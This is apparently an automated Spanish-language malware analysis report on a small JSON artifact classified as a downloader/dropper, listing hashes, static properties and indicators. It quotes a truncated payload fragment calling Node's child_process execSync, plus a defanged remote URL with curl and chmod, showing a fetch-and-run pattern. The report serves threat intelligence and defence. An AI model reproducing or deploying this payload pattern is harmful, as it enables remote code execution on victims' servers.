# 🧬 Payload Analysis

`503b82ae05653b546ab03052c63b1648c65dd406dfad2155156a34b53f02aac4`

## 📌 Resumen

Artefacto identificado como JSON text data de 896 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `cumshotnews` en `hxxp://192.142.28.XXX/cumshotnews`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `chmod`
2. `curl`
3. `cd /var/run`
4. `cd /m` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/503b82ae05653b546ab03052c63b1648c65dd406dfad2155156a34b53f02aac4.md](../../../../../malware-like/oraculo/downloader/503b82ae05653b546ab03052c63b1648c65dd406dfad2155156a34b53f02aac4.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:23:38.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `503b82ae05653b546ab03052c63b1648c65dd406dfad2155156a34b53f02aac4`
- **SHA1:** `40afc7f5948848c867cc68242403fb5907afe0a1`
- **MD5:** `7e7aed6ce821760415500f8d5a8f57d2`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | JSON text data |
| Tamaño | 896 B |
| Entropía | 5.15 |
| Strings | 1 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=JSON text data; iocs=5

## 🖥️ Comandos observados / extraídos

```text
{"params":{"script":{"code":"const cp = require(\"child_process\");try{const r=cp.execSync(\"cd /tmp||cd /var/run||cd /m
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://192.142.28.XXX/cumshotnews;chmod | strings |
| url | hxxp://192.142.28.XXX/cumshotnews;curl | strings |
| ip | 192.142.28.XXX | static_analysis |
| command | {"params":{"script":{"code":"const cp = require(\"child_process\");try{const r=cp.execSync(\"cd /tmp\|\|cd /var/run\|\|cd /m | strings |
| hash | 503b82ae05653b546ab03052c63b1648c65dd406dfad2155156a34b53f02aac4 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
